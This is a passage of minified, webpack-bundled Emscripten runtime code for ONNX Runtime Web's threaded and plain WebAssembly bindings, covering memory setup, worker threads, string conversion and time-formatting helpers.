oa=console.log.bind(console),pa=console.error.bind(console);B&&(oa=(...a)=>fs.writeSync(1,a.join(" ")+"\n"),pa=(...a)=>fs.writeSync(2,a.join(" ")+"\n"));var J,qa=w.print||oa,I=w.printErr||pa;Object.assign(w,ia),ia=null,w.thisProgram&&(ja=w.thisProgram),w.quit&&(z=w.quit),w.wasmBinary&&(J=w.wasmBinary);var noExitRuntime=w.noExitRuntime||!0;"object"!=typeof WebAssembly&&K("no native wasm support detected");var d,L,ra,N,l,ba,ca,da,fa,M=!1;function m(){var a=d.buffer;w.HEAP8=l=new Int8Array(a),w.HEAP16=new Int16Array(a),w.HEAP32=ca=new Int32Array(a),w.HEAPU8=ba=new Uint8Array(a),w.HEAPU16=new Uint16Array(a),w.HEAPU32=da=new Uint32Array(a),w.HEAPF32=new Float32Array(a),w.HEAPF64=fa=new Float64Array(a)}var O=w.INITIAL_MEMORY||16777216;if(5242880<=O||K("INITIAL_MEMORY should be larger than STACK_SIZE, was "+O+"! (STACK_SIZE=5242880)"),D)d=w.wasmMemory;else if(w.wasmMemory)d=w.wasmMemory;else if(!((d=new WebAssembly.Memory({initial:O/65536,maximum:65536,shared:!0})).buffer instanceof SharedArrayBuffer))throw I("requested a shared WebAssembly.Memory but the returned buffer is not a SharedArrayBuffer, indicating that while the browser has SharedArrayBuffer it does not have WebAssembly threads support - you may need to set a flag"),B&&I("(on node you may need: --experimental-wasm-threads --experimental-wasm-bulk-memory and/or recent version)"),Error("bad memory");m(),O=d.buffer.byteLength;var sa,ta=[],ua=[],va=[],wa=0;function P(){return noExitRuntime||0<wa}var S,T,Q=0,xa=null,R=null;function ya(){Q++,w.monitorRunDependencies&&w.monitorRunDependencies(Q)}function za(){if(Q--,w.monitorRunDependencies&&w.monitorRunDependencies(Q),0==Q&&(null!==xa&&(clearInterval(xa),xa=null),R)){var a=R;R=null,a()}}function K(a){throw w.onAbort&&w.onAbort(a),I(a="Aborted("+a+")"),M=!0,N=1,a=new WebAssembly.RuntimeError(a+". Build with -sASSERTIONS for more info."),x(a),a}function Aa(a){return a.startsWith("data:application/octet-stream;base64,")}function Ba(a){if(a==S&&J)return new Uint8Array(J);if(H)return H(a);throw"both async and sync fetching of the wasm failed"}function Da(a,b,c){return function Ca(a){if(!J&&(ka||A)){if("function"==typeof fetch&&!a.startsWith("file://"))return fetch(a,{credentials:"same-origin"}).then((b=>{if(!b.ok)throw"failed to load wasm binary file at '"+a+"'";return b.arrayBuffer()})).catch((()=>Ba(a)));if(F)return new Promise(((b,c)=>{F(a,(e=>b(new Uint8Array(e))),c)}))}return Promise.resolve().then((()=>Ba(a)))}(a).then((e=>WebAssembly.instantiate(e,b))).then((e=>e)).then(c,(e=>{I("failed to asynchronously prepare wasm: "+e),K(e)}))}function U(a){this.name="ExitStatus",this.message=`Program terminated with exit(${a})`,this.status=a}function Fa(a){a.terminate(),a.onmessage=()=>{}}function Ga(a){(a=V.Fa[a])||K(),V.fb(a)}function Ha(a){var b=V.Za();if(!b)return 6;V.Ia.push(b),V.Fa[a.Ha]=b,b.Ha=a.Ha;var c={cmd:"run",start_routine:a.gb,arg:a.Ya,pthread_ptr:a.Ha};return B&&b.unref(),b.postMessage(c,a.mb),0}Aa(S="ort-wasm-threaded.wasm")||(S=la(S));var Ia="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0,Ja=(a,b,c)=>{var e=(b>>>=0)+c;for(c=b;a[c]&&!(c>=e);)++c;if(16<c-b&&a.buffer&&Ia)return Ia.decode(a.buffer instanceof SharedArrayBuffer?a.slice(b,c):a.subarray(b,c));for(e="";b<c;){var h=a[b++];if(128&h){var g=63&a[b++];if(192==(224&h))e+=String.fromCharCode((31&h)<<6|g);else{var k=63&a[b++];65536>(h=224==(240&h)?(15&h)<<12|g<<6|k:(7&h)<<18|g<<12|k<<6|63&a[b++])?e+=String.fromCharCode(h):(h-=65536,e+=String.fromCharCode(55296|h>>10,56320|1023&h))}}else e+=String.fromCharCode(h)}return e},Ka=(a,b)=>(a>>>=0)?Ja(n(),a,b):"";function La(a){if(D)return W(1,1,a);N=a,P()||(V.hb(),w.onExit&&w.onExit(a),M=!0),z(a,new U(a))}var Na=a=>{if(N=a,D)throw Ma(a),"unwind";La(a)},V={La:[],Ia:[],Ta:[],Fa:{},Pa:function(){D?V.ab():V.$a()},$a:function(){ta.unshift((()=>{ya(),V.bb((()=>za()))}))},ab:function(){V.receiveObjectTransfer=V.eb,V.threadInitTLS=V.Sa,V.setExitStatus=V.Ra,noExitRuntime=!1},Ra:function(a){N=a},rb:["$terminateWorker"],hb:function(){for(var a of V.Ia)Fa(a);for(a of V.La)Fa(a);V.La=[],V.Ia=[],V.Fa=[]},fb:function(a){var b=a.Ha;delete V.Fa[b],V.La.push(a),V.Ia.splice(V.Ia.indexOf(a),1),a.Ha=0,Oa(b)},eb:function(){},Sa:function(){V.Ta.forEach((a=>a()))},cb:a=>new Promise((b=>{a.onmessage=g=>{var k=(g=g.data).cmd;if(g.targetThread&&g.targetThread!=X()){var t=V.Fa[g.qb];t?t.postMessage(g,g.transferList):I('Internal error! Worker sent a message "'+k+'" to target pthread '+g.targetThread+", but that thread no longer exists!")}else"checkMailbox"===k?Y():"spawnThread"===k?Ha(g):"cleanupThread"===k?Ga(g.thread):"killThread"===k?(g=g.thread,k=V.Fa[g],delete V.Fa[g],Fa(k),Oa(g),V.Ia.splice(V.Ia.indexOf(k),1),k.Ha=0):"cancelThread"===k?V.Fa[g.thread].postMessage({cmd:"cancel"}):"loaded"===k?(a.loaded=!0,b(a)):"alert"===k?alert("Thread "+g.threadId+": "+g.text):"setimmediate"===g.target?a.postMessage(g):"callHandler"===k?w[g.handler](...g.args):k&&I("worker sent an unknown command "+k)},a.onerror=g=>{throw I("worker sent an error! "+g.filename+":"+g.lineno+": "+g.message),g},B&&(a.on("message",(function(g){a.onmessage({data:g})})),a.on("error",(function(g){a.onerror(g)})));var h,c=[];for(h of["onExit","onAbort","print","printErr"])w.hasOwnProperty(h)&&c.push(h);a.postMessage({cmd:"load",handlers:c,urlOrBlob:w.mainScriptUrlOrBlob||_scriptDir,wasmMemory:d,wasmModule:ra})})),bb:function(a){a()},Xa:function(){var a=la("ort-wasm-threaded.worker.js");a=new Worker(a),V.La.push(a)},Za:function(){return 0==V.La.length&&(V.Xa(),V.cb(V.La[0])),V.La.pop()}};w.PThread=V;var Pa=a=>{for(;0<a.length;)a.shift()(w)};function Ma(a){if(D)return W(2,0,a);Na(a)}w.establishStackSpace=function(){var a=X(),b=p()[a+52>>2>>>0];a=p()[a+56>>2>>>0],Qa(b,b-a),Ra(b)};var Sa=[];function Ua(a){this.Oa=a-24,this.Wa=function(b){r()[this.Oa+4>>2>>>0]=b},this.Va=function(b){r()[this.Oa+8>>2>>>0]=b},this.Pa=function(b,c){this.Ua(),this.Wa(b),this.Va(c)},this.Ua=function(){r()[this.Oa+16>>2>>>0]=0}}function Xa(a,b,c,e){return D?W(3,1,a,b,c,e):Ya(a,b,c,e)}function Ya(a,b,c,e){if(a>>>=0,b>>>=0,c>>>=0,e>>>=0,"undefined"==typeof SharedArrayBuffer)return I("Current environment does not support SharedArrayBuffer, pthreads are not available!"),6;var h=[];return D&&0===h.length?Xa(a,b,c,e):(a={gb:c,Ha:a,Ya:e,mb:h},D?(a.ob="spawnThread",postMessage(a,h),0):Ha(a))}function Za(a,b,c){return D?W(4,1,a,b,c):0}function $a(a,b){if(D)return W(5,1,a,b)}w.invokeEntryPoint=function(a,b){var c=Sa[a];c||(a>=Sa.length&&(Sa.length=a+1),Sa[a]=c=sa.get(a)),a=c(b),P()?V.Ra(a):Ta(a)};var ab=a=>{for(var b=0,c=0;c<a.length;++c){var e=a.charCodeAt(c);127>=e?b++:2047>=e?b+=2:55296<=e&&57343>=e?(b+=4,++c):b+=3}return b},bb=(a,b,c,e)=>{if(!(0<e))return 0;var h=c>>>=0;e=c+e-1;for(var g=0;g<a.length;++g){var k=a.charCodeAt(g);if(55296<=k&&57343>=k&&(k=65536+((1023&k)<<10)|1023&a.charCodeAt(++g)),127>=k){if(c>=e)break;b[c++>>>0]=k}else{if(2047>=k){if(c+1>=e)break;b[c++>>>0]=192|k>>6}else{if(65535>=k){if(c+2>=e)break;b[c++>>>0]=224|k>>12}else{if(c+3>=e)break;b[c++>>>0]=240|k>>18,b[c++>>>0]=128|k>>12&63}b[c++>>>0]=128|k>>6&63}b[c++>>>0]=128|63&k}}return b[c>>>0]=0,c-h},cb=(a,b,c)=>bb(a,n(),b,c);function db(a,b){if(D)return W(6,1,a,b)}function eb(a,b,c){if(D)return W(7,1,a,b,c)}function fb(a,b,c){return D?W(8,1,a,b,c):0}function gb(a,b){if(D)return W(9,1,a,b)}function hb(a,b,c){if(D)return W(10,1,a,b,c)}function ib(a,b,c,e){if(D)return W(11,1,a,b,c,e)}function jb(a,b,c,e){if(D)return W(12,1,a,b,c,e)}function kb(a,b,c,e){if(D)return W(13,1,a,b,c,e)}function lb(a){if(D)return W(14,1,a)}function mb(a,b){if(D)return W(15,1,a,b)}function nb(a,b,c){if(D)return W(16,1,a,b,c)}var ob=a=>{if(!M)try{if(a(),!P())try{D?Ta(N):Na(N)}catch(b){b instanceof U||"unwind"==b||z(1,b)}}catch(b){b instanceof U||"unwind"==b||z(1,b)}};function pb(a){a>>>=0,"function"==typeof Atomics.nb&&(Atomics.nb(p(),a>>2,a).value.then(Y),a+=128,Atomics.store(p(),a>>2,1))}function Y(){var a=X();a&&(pb(a),ob((()=>qb())))}w.__emscripten_thread_mailbox_await=pb,w.checkMailbox=Y;var Z=a=>0==a%4&&(0!=a%100||0==a%400),rb=[0,31,60,91,121,152,182,213,244,274,305,335],sb=[0,31,59,90,120,151,181,212,243,273,304,334];function tb(a,b,c,e,h,g,k,t){return D?W(17,1,a,b,c,e,h,g,k,t):-52}function ub(a,b,c,e,h,g,k){if(D)return W(18,1,a,b,c,e,h,g,k)}var wb=a=>{var b=ab(a)+1,c=vb(b);return c&&cb(a,c,b),c},yb=a=>{var b=xb();return a=a(),Ra(b),a};function W(a,b){var c=arguments.length-2,e=arguments;return yb((()=>{for(var h=zb(8*c),g=h>>3,k=0;k<c;k++){var t=e[2+k];ea()[g+k>>>0]=t}return Ab(a,c,h,b)}))}var Db,Bb=[],Cb={},Eb=()=>{if(!Db){var b,a={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-","_")+".UTF-8",_:ja||"./this.program"};for(b in Cb)void 0===Cb[b]?delete a[b]:a[b]=Cb[b];var c=[];for(b in a)c.push(`${b}=${a[b]}`);Db=c}return Db};function Fb(a,b){if(D)return W(19,1,a,b);a>>>=0,b>>>=0;var c=0;return Eb().forEach((function(e,h){var g=b+c;for(h=r()[a+4*h>>2>>>0]=g,g=0;g<e.length;++g)aa()[h++>>0>>>0]=e.charCodeAt(g);aa()[h>>0>>>0]=0,c+=e.length+1})),0}function Gb(a,b){if(D)return W(20,1,a,b);a>>>=0,b>>>=0;var c=Eb();r()[a>>2>>>0]=c.length;var e=0;return c.forEach((function(h){e+=h.length+1})),r()[b>>2>>>0]=e,0}function Hb(a){return D?W(21,1,a):52}function Ib(a,b,c,e){return D?W(22,1,a,b,c,e):52}function Mb(a,b,c,e,h){return D?W(23,1,a,b,c,e,h):70}var Nb=[null,[],[]];function Ob(a,b,c,e){if(D)return W(24,1,a,b,c,e);b>>>=0,c>>>=0,e>>>=0;for(var h=0,g=0;g<c;g++){var k=r()[b>>2>>>0],t=r()[b+4>>2>>>0];b+=8;for(var C=0;C<t;C++){var v=n()[k+C>>>0],y=Nb[a];0===v||10===v?((1===a?qa:I)(Ja(y,0)),y.length=0):y.push(v)}h+=t}return r()[e>>2>>>0]=h,0}var Qb=a=>(Qb=(()=>{if("object"==typeof crypto&&"function"==typeof crypto.getRandomValues)return c=>(c.set(crypto.getRandomValues(new Uint8Array(c.byteLength))),c);if(B)try{var a=__webpack_require__("?892d");if(a.randomFillSync)return c=>a.randomFillSync(c);var b=a.randomBytes;return c=>(c.set(b(c.byteLength)),c)}catch(c){}K("initRandomDevice")})())(a),Rb=[31,29,31,30,31,30,31,31,30,31,30,31],Sb=[31,28,31,30,31,30,31,31,30,31,30,31];function Vb(a,b,c,e){function h(f,q,u){for(f="number"==typeof f?f.toString():f||"";f.length<q;)f=u[0]+f;return f}function g(f,q){return h(f,q,"0")}function k(f,q){function u(Jb){return 0>Jb?-1:0<Jb?1:0}var G;return 0===(G=u(f.getFullYear()-q.getFullYear()))&&0===(G=u(f.getMonth()-q.getMonth()))&&(G=u(f.getDate()-q.getDate())),G}function t(f){switch(f.getDay()){case 0:return new Date(f.getFullYear()-1,11,29);case 1:return f;case 2:return new Date(f.getFullYear(),0,3);case 3:return new Date(f.getFullYear(),0,2);case 4:return new Date(f.getFullYear(),0,1);case 5:return new Date(f.getFullYear()-1,11,31);case 6:return new Date(f.getFullYear()-1,11,30)}}function C(f){var q=f.Ja;for(f=new Date(new Date(f.Ka+1900,0,1).getTime());0<q;){var u=f.getMonth(),G=(Z(f.getFullYear())?Rb:Sb)[u];if(!(q>G-f.getDate())){f.setDate(f.getDate()+q);break}q-=G-f.getDate()+1,f.setDate(1),11>u?f.setMonth(u+1):(f.setMonth(0),f.setFullYear(f.getFullYear()+1))}return u=new Date(f.getFullYear()+1,0,4),q=t(new Date(f.getFullYear(),0,4)),u=t(u),0>=k(q,f)?0>=k(u,f)?f.getFullYear()+1:f.getFullYear():f.getFullYear()-1}a>>>=0,b>>>=0,c>>>=0,e>>>=0;var v=p()[e+40>>2>>>0];for(var y in e={kb:p()[e>>2>>>0],jb:p()[e+4>>2>>>0],Ma:p()[e+8>>2>>>0],Qa:p()[e+12>>2>>>0],Na:p()[e+16>>2>>>0],Ka:p()[e+20>>2>>>0],Ga:p()[e+24>>2>>>0],Ja:p()[e+28>>2>>>0],sb:p()[e+32>>2>>>0],ib:p()[e+36>>2>>>0],lb:v?Ka(v):""},c=Ka(c),v={"%c":"%a %b %d %H:%M:%S %Y","%D":"%m/%d/%y","%F":"%Y-%m-%d","%h":"%b","%r":"%I:%M:%S %p","%R":"%H:%M","%T":"%H:%M:%S","%x":"%m/%d/%y","%X":"%H:%M:%S","%Ec":"%c","%EC":"%C","%Ex":"%m/%d/%y","%EX":"%H:%M:%S","%Ey":"%y","%EY":"%Y","%Od":"%d","%Oe":"%e","%OH":"%H","%OI":"%I","%Om":"%m","%OM":"%M","%OS":"%S","%Ou":"%u","%OU":"%U","%OV":"%V","%Ow":"%w","%OW":"%W","%Oy":"%y"})c=c.replace(new RegExp(y,"g"),v[y]);var Kb="Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),Lb="January February March April May June July August September October November December".split(" ");for(y in v={"%a":f=>Kb[f.Ga].substring(0,3),"%A":f=>Kb[f.Ga],"%b":f=>Lb[f.Na].substring(0,3),"%B":f=>Lb[f.Na],"%C":f=>g((f.Ka+1900)/100|0,2),"%d":f=>g(f.Qa,2),"%e":f=>h(f.Qa,2," "),"%g":f=>C(f).toString().substring(2),"%G":f=>C(f),"%H":f=>g(f.Ma,2),"%I":f=>(0==(f=f.Ma)?f=12:12<f&&(f-=12),g(f,2)),"%j":f=>{for(var q=0,u=0;u<=f.Na-1;q+=(Z(f.Ka+1900)?Rb:Sb)[u++]);return g(f.Qa+q,3)},"%m":f=>g(f.Na+1,2),"%M":f=>g(f.jb,2),"%n":()=>"\n","%p":f=>0<=f.Ma&&12>f.Ma?"AM":"PM","%S":f=>g(f.kb,2),"%t":()=>"\t","%u":f=>f.Ga||7,"%U":f=>g(Math.floor((f.Ja+7-f.Ga)/7),2),"%V":f=>{var q=Math.floor((f.Ja+7-(f.Ga+6)%7)/7);if(2>=(f.Ga+371-f.Ja-2)%7&&q++,q)53==q&&(4==(u=(f.Ga+371-f.Ja)%7)||3==u&&Z(f.Ka)||(q=1));else{q=52;var u=(f.Ga+7-f.Ja-1)%7;(4==u||5==u&&Z(f.Ka%400-1))&&q++}return g(q,2)},"%w":f=>f.Ga,"%W":f=>g(Math.floor((f.Ja+7-(f.Ga+6)%7)/7),2),"%y":f=>(f.Ka+1900).toString().substring(2),"%Y":f=>f.Ka+1900,"%z":f=>{var q=0<=(f=f.ib);return f=Math.abs(f)/60,(q?"+":"-")+String("0000"+(f/60*100+f%60)).slice(-4)},"%Z":f=>f.lb,"%%":()=>"%"},c=c.replace(/%%/g,"\0\0"),v)c.includes(y)&&(c=c.replace(new RegExp(y,"g"),v[y](e)));return y=function Tb(a){var b=Array(ab(a)+1);return bb(a,b,0,b.length),b}(c=c.replace(/\0\0/g,"%")),y.length>b?0:(((a,b)=>{aa().set(a,b>>>0)})(y,a),y.length-1)}V.Pa();var Wb=[null,La,Ma,Xa,Za,$a,db,eb,fb,gb,hb,ib,jb,kb,lb,mb,nb,tb,ub,Fb,Gb,Hb,Ib,Mb,Ob],Zb={b:function(a,b,c){throw new Ua(a>>>=0).Pa(b>>>0,c>>>0),a},N:function(a){Xb(a>>>0,!A,1,!ka,131072,!1),V.Sa()},k:function(a){a>>>=0,D?postMessage({cmd:"cleanupThread",thread:a}):Ga(a)},I:Ya,h:Za,T:$a,E:db,G:eb,U:fb,R:gb,J:hb,Q:ib,o:jb,F:kb,C:lb,S:mb,D:nb,q:()=>!0,A:function(a,b){(a>>>=0)==b>>>0?setTimeout((()=>Y())):D?postMessage({targetThread:a,cmd:"checkMailbox"}):(a=V.Fa[a])&&a.postMessage({cmd:"checkMailbox"})},L:function(){return-1},M:pb,p:function(a){B&&V.Fa[a>>>0].ref()},t:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN,c>>>=0,a=new Date(1e3*a),p()[c>>2>>>0]=a.getUTCSeconds(),p()[c+4>>2>>>0]=a.getUTCMinutes(),p()[c+8>>2>>>0]=a.getUTCHours(),p()[c+12>>2>>>0]=a.getUTCDate(),p()[c+16>>2>>>0]=a.getUTCMonth(),p()[c+20>>2>>>0]=a.getUTCFullYear()-1900,p()[c+24>>2>>>0]=a.getUTCDay(),a=(a.getTime()-Date.UTC(a.getUTCFullYear(),0,1,0,0,0,0))/864e5|0,p()[c+28>>2>>>0]=a},u:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN,c>>>=0,a=new Date(1e3*a),p()[c>>2>>>0]=a.getSeconds(),p()[c+4>>2>>>0]=a.getMinutes(),p()[c+8>>2>>>0]=a.getHours(),p()[c+12>>2>>>0]=a.getDate(),p()[c+16>>2>>>0]=a.getMonth(),p()[c+20>>2>>>0]=a.getFullYear()-1900,p()[c+24>>2>>>0]=a.getDay(),b=(Z(a.getFullYear())?rb:sb)[a.getMonth()]+a.getDate()-1|0,p()[c+28>>2>>>0]=b,p()[c+36>>2>>>0]=-60*a.getTimezoneOffset(),b=new Date(a.getFullYear(),6,1).getTimezoneOffset();var e=new Date(a.getFullYear(),0,1).getTimezoneOffset();a=0|(b!=e&&a.getTimezoneOffset()==Math.min(e,b)),p()[c+32>>2>>>0]=a},v:function(a){a>>>=0;var b=new Date(p()[a+20>>2>>>0]+1900,p()[a+16>>2>>>0],p()[a+12>>2>>>0],p()[a+8>>2>>>0],p()[a+4>>2>>>0],p()[a>>2>>>0],0),c=p()[a+32>>2>>>0],e=b.getTimezoneOffset(),h=new Date(b.getFullYear(),6,1).getTimezoneOffset(),g=new Date(b.getFullYear(),0,1).getTimezoneOffset(),k=Math.min(g,h);return 0>c?p()[a+32>>2>>>0]=Number(h!=g&&k==e):0<c!=(k==e)&&(h=Math.max(g,h),b.setTime(b.getTime()+6e4*((0<c?k:h)-e))),p()[a+24>>2>>>0]=b.getDay(),c=(Z(b.getFullYear())?rb:sb)[b.getMonth()]+b.getDate()-1|0,p()[a+28>>2>>>0]=c,p()[a>>2>>>0]=b.getSeconds(),p()[a+4>>2>>>0]=b.getMinutes(),p()[a+8>>2>>>0]=b.getHours(),p()[a+12>>2>>>0]=b.getDate(),p()[a+16>>2>>>0]=b.getMonth(),p()[a+20>>2>>>0]=b.getYear(),a=b.getTime()/1e3,Yb((T=a,1<=+Math.abs(T)?0<T?+Math.floor(T/4294967296)>>>0:~~+Math.ceil((T-+(~~T>>>0))/4294967296)>>>0:0)),a>>>0},r:tb,s:ub,z:function(a,b,c){function e(v){return(v=v.toTimeString().match(/\(([A-Za-z ]+)\)$/))?v[1]:"GMT"}a>>>=0,b>>>=0,c>>>=0;var h=(new Date).getFullYear(),g=new Date(h,0,1),k=new Date(h,6,1);h=g.getTimezoneOffset();var t=k.getTimezoneOffset(),C=Math.max(h,t);r()[a>>2>>>0]=60*C,p()[b>>2>>>0]=Number(h!=t),a=e(g),b=e(k),a=wb(a),b=wb(b),t<h?(r()[c>>2>>>0]=a,r()[c+4>>2>>>0]=b):(r()[c>>2>>>0]=b,r()[c+4>>2>>>0]=a)},c:()=>{K("")},l:function(){},i:function(){return Date.now()},V:()=>{throw wa+=1,"unwind"},B:function(){return 4294901760},e:()=>performance.timeOrigin+performance.now(),f:function(){return B?__webpack_require__("?aedb").cpus().length:navigator.hardwareConcurrency},K:function(a,b,c,e){for(V.pb=b>>>0,Bb.length=c,b=e>>>0>>3,e=0;e<c;e++)Bb[e]=ea()[b+e>>>0];return Wb[a].apply(null,Bb)},y:function(a){a>>>=0;var b=n().length;if(a<=b||4294901760<a)return!1;for(var c=1;4>=c;c*=2){var e=b*(1+.2/c);e=Math.min(e,a+100663296);var h=Math;e=Math.max(a,e);a:{h=h.min.call(h,4294901760,e+(65536-e%65536)%65536)-d.buffer.byteLength+65535>>>16;try{d.grow(h),m();var g=1;break a}catch(k){}g=void 0}if(g)return!0}return!1},O:Fb,P:Gb,j:Na,g:Hb,n:Ib,w:Mb,m:Ob,x:function(a,b){return a>>>=0,b>>>=0,Qb(n().subarray(a>>>0,a+b>>>0)),0},a:d||w.wasmMemory,H:Vb,d:function(a,b,c,e){return Vb(a>>>0,b>>>0,c>>>0,e>>>0)}};!function(){function a(c,e){return c=c.exports,L=c=function $b(a){a=Object.assign({},a);var b=e=>()=>e()>>>0,c=e=>h=>e(h)>>>0;return a.__errno_location=b(a.__errno_location),a.pthread_self=b(a.pthread_self),a.malloc=c(a.malloc),a.stackSave=b(a.stackSave),a.stackAlloc=c(a.stackAlloc),a}(c),V.Ta.push(L.sa),sa=L.ta,ua.unshift(L.W),ra=e,za(),c}var b={a:Zb};if(ya(),w.instantiateWasm)try{return w.instantiateWasm(b,a)}catch(c){I("Module.instantiateWasm callback failed with error: "+c),x(c)}(function Ea(a,b){var c=S;return J||"function"!=typeof WebAssembly.instantiateStreaming||Aa(c)||c.startsWith("file://")||B||"function"!=typeof fetch?Da(c,a,b):fetch(c,{credentials:"same-origin"}).then((e=>WebAssembly.instantiateStreaming(e,a).then(b,(function(h){return I("wasm streaming compile failed: "+h),I("falling back to ArrayBuffer instantiation"),Da(c,a,b)}))))})(b,(function(c){a(c.instance,c.module)})).catch(x)}(),w._OrtInit=(a,b)=>(w._OrtInit=L.X)(a,b),w._OrtGetLastError=(a,b)=>(w._OrtGetLastError=L.Y)(a,b),w._OrtCreateSessionOptions=(a,b,c,e,h,g,k,t,C,v)=>(w._OrtCreateSessionOptions=L.Z)(a,b,c,e,h,g,k,t,C,v),w._OrtAppendExecutionProvider=(a,b)=>(w._OrtAppendExecutionProvider=L._)(a,b),w._OrtAddSessionConfigEntry=(a,b,c)=>(w._OrtAddSessionConfigEntry=L.$)(a,b,c),w._OrtReleaseSessionOptions=a=>(w._OrtReleaseSessionOptions=L.aa)(a),w._OrtCreateSession=(a,b,c)=>(w._OrtCreateSession=L.ba)(a,b,c),w._OrtReleaseSession=a=>(w._OrtReleaseSession=L.ca)(a),w._OrtGetInputOutputCount=(a,b,c)=>(w._OrtGetInputOutputCount=L.da)(a,b,c),w._OrtGetInputName=(a,b)=>(w._OrtGetInputName=L.ea)(a,b),w._OrtGetOutputName=(a,b)=>(w._OrtGetOutputName=L.fa)(a,b),w._OrtFree=a=>(w._OrtFree=L.ga)(a),w._OrtCreateTensor=(a,b,c,e,h)=>(w._OrtCreateTensor=L.ha)(a,b,c,e,h),w._OrtGetTensorData=(a,b,c,e,h)=>(w._OrtGetTensorData=L.ia)(a,b,c,e,h),w._OrtReleaseTensor=a=>(w._OrtReleaseTensor=L.ja)(a),w._OrtCreateRunOptions=(a,b,c,e)=>(w._OrtCreateRunOptions=L.ka)(a,b,c,e),w._OrtAddRunConfigEntry=(a,b,c)=>(w._OrtAddRunConfigEntry=L.la)(a,b,c),w._OrtReleaseRunOptions=a=>(w._OrtReleaseRunOptions=L.ma)(a),w._OrtRun=(a,b,c,e,h,g,k,t)=>(w._OrtRun=L.na)(a,b,c,e,h,g,k,t),w._OrtEndProfiling=a=>(w._OrtEndProfiling=L.oa)(a);var X=w._pthread_self=()=>(X=w._pthread_self=L.pa)(),vb=w._malloc=a=>(vb=w._malloc=L.qa)(a);w._free=a=>(w._free=L.ra)(a),w.__emscripten_tls_init=()=>(w.__emscripten_tls_init=L.sa)();var Xb=w.__emscripten_thread_init=(a,b,c,e,h,g)=>(Xb=w.__emscripten_thread_init=L.ua)(a,b,c,e,h,g);w.__emscripten_thread_crashed=()=>(w.__emscripten_thread_crashed=L.va)();var ac,Ab=(a,b,c,e)=>(Ab=L.wa)(a,b,c,e),Oa=a=>(Oa=L.xa)(a),Ta=w.__emscripten_thread_exit=a=>(Ta=w.__emscripten_thread_exit=L.ya)(a),qb=w.__emscripten_check_mailbox=()=>(qb=w.__emscripten_check_mailbox=L.za)(),Yb=a=>(Yb=L.Aa)(a),Qa=(a,b)=>(Qa=L.Ba)(a,b),xb=()=>(xb=L.Ca)(),Ra=a=>(Ra=L.Da)(a),zb=a=>(zb=L.Ea)(a);function cc(){function a(){if(!ac&&(ac=!0,w.calledRun=!0,!M)&&(D||Pa(ua),ha(w),w.onRuntimeInitialized&&w.onRuntimeInitialized(),!D)){if(w.postRun)for("function"==typeof w.postRun&&(w.postRun=[w.postRun]);w.postRun.length;){var b=w.postRun.shift();va.unshift(b)}Pa(va)}}if(!(0<Q))if(D)ha(w),D||Pa(ua),startWorker(w);else{if(w.preRun)for("function"==typeof w.preRun&&(w.preRun=[w.preRun]);w.preRun.length;)ta.unshift(w.preRun.shift());Pa(ta),0<Q||(w.setStatus?(w.setStatus("Running..."),setTimeout((function(){setTimeout((function(){w.setStatus("")}),1),a()}),1)):a())}}if(w.keepRuntimeAlive=P,w.wasmMemory=d,w.stackAlloc=zb,w.stackSave=xb,w.stackRestore=Ra,w.UTF8ToString=Ka,w.stringToUTF8=cb,w.lengthBytesUTF8=ab,w.ExitStatus=U,w.PThread=V,R=function bc(){ac||cc(),ac||(R=bc)},w.preInit)for("function"==typeof w.preInit&&(w.preInit=[w.preInit]);0<w.preInit.length;)w.preInit.pop()();return cc(),moduleArg.ready});module.exports=ortWasmThreaded},"./lib/wasm/binding/ort-wasm.js":(module,__unused_webpack_exports,__webpack_require__)=>{var _scriptDir,ortWasm=(_scriptDir="undefined"!=typeof document&&document.currentScript?document.currentScript.src:void 0,"undefined"!=typeof __filename&&(_scriptDir=_scriptDir||__filename),function(moduleArg={}){var aa,h,e=moduleArg;e.ready=new Promise(((a,b)=>{aa=a,h=b}));var A,B,C,ba=Object.assign({},e),m="./this.program",q=(a,b)=>{throw b},ca="object"==typeof window,v="function"==typeof importScripts,x="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node,y="";if(x){var fs=__webpack_require__("?63c8"),D=__webpack_require__("?75c6");y=v?D.dirname(y)+"/":__dirname+"/",A=(a,b)=>(a=a.startsWith("file://")?new URL(a):D.normalize(a),fs.readFileSync(a,b?void 0:"utf8")),C=a=>((a=A(a,!0)).buffer||(a=new Uint8Array(a)),a),B=(a,b,c,f=!0)=>{a=a.startsWith("file://")?new URL(a):D.normalize(a),fs.readFile(a,f?void 0:"utf8",((g,k)=>{g?c(g):b(f?k.buffer:k)}))},!e.thisProgram&&1<process.argv.length&&(m=process.argv[1].replace(/\\/g,"/")),process.argv.slice(2),q=(a,b)=>{throw process.exitCode=a,b},e.inspect=()=>"[Emscripten Module object]"}else(ca||v)&&(v?y=self.location.href:"undefined"!=typeof document&&document.currentScript&&(y=document.currentScript.src),_scriptDir&&(y=_scriptDir),y=0!==y.indexOf("blob:")?y.substr(0,y.replace(/[?#].*/,"").lastIndexOf("/")+1):"",A=a=>{var b=new XMLHttpRequest;return b.open("GET",a,!1),b.send(null),b.responseText},v&&(C=a=>{var b=new XMLHttpRequest;return b.open("GET",a,!1),b.responseType="arraybuffer",b.send(null),new Uint8Array(b.response)}),B=(a,b,c)=>{var f=new XMLHttpRequest;f.open("GET",a,!0),f.responseType="arraybuffer",f.onload=()=>{200==f.status||0==f.status&&f.response?b(f.response):c()},f.onerror=c,f.send(null)});var F,da=e.print||console.log.bind(console),E=e.printErr||console.error.bind(console);Object.assign(e,ba),ba=null,e.thisProgram&&(m=e.thisProgram),e.quit&&(q=e.quit),e.wasmBinary&&(F=e.wasmBinary);var noExitRuntime=e.noExitRuntime||!0;"object"!=typeof WebAssembly&&G("no native wasm support detected");var H,I,K,L,M,N,J=!1;function ea(){var a=H.buffer;e.HEAP8=K=new Int8Array(a),e.HEAP16=new Int16Array(a),e.HEAP32=M=new Int32Array(a),e.HEAPU8=L=new Uint8Array(a),e.HEAPU16=new Uint16Array(a),e.HEAPU32=N=new Uint32Array(a),e.HEAPF32=new Float32Array(a),e.HEAPF64=new Float64Array(a)}var fa=[],ha=[],ia=[];function ja(){var a=e.preRun.shift();fa.unshift(a)}var 